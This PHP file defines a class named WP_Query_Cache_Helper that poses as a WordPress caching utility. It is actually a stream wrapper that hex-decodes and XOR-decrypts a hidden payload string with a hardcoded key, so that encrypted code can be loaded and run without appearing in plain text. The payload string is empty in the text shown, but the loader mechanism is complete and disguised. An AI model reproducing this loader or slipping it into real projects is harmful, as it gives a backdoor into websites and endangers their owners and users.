<?php
class WP_Query_Cache_Helper {
    private $buf="";
    private $pos=0;
    private static $k="N3wFiL3_K3y_xX9pQr2mLz7vTw4sBh8j";
    public static $d="";
    public function stream_open($p,$m,$o,&$op){
        $h=self::$d;
        $b="";
        for($i=0;$i<strlen($h);$i+=2)$b.=chr(hexdec(substr($h,$i,2)));
        $kk=self::$k;$kl=strlen($kk);$r="";
        for($i=0;$i<strlen($b);$i++)$r.=chr(ord($b[$i])^ord($kk[$i%$kl]));
        $this->buf=$r;$this->pos=0;return true;
    }
    public function stream_read($n){$r=substr($this->buf,$this->pos,$n);$this->pos+=strlen($r);return $r;}
    public function stream_eof(){return $this->pos>=strlen($this->buf);}
    public function stream_stat(){return array("size"=>strlen($this->buf));}
    public function url_stat($p,$f){return false;}
}
